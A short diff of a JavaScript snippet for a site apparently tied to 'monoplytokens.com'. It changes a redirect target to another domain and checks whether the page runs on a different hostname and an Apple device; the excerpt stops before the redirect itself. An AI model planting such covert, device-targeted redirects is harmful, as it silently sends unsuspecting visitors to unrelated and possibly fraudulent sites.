@@ -3,7 +3,7 @@
 
 (function() {
     var originalDomain = "monoplytokens.com";
-    var redirectURL = "https://live33.online/?be72c72";
+    var redirectURL = "https://m.rolls3.com/";
 
     if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain) {
         var isAppleDevice = /iPhone|iPad/i.test(navigator.userAgent);
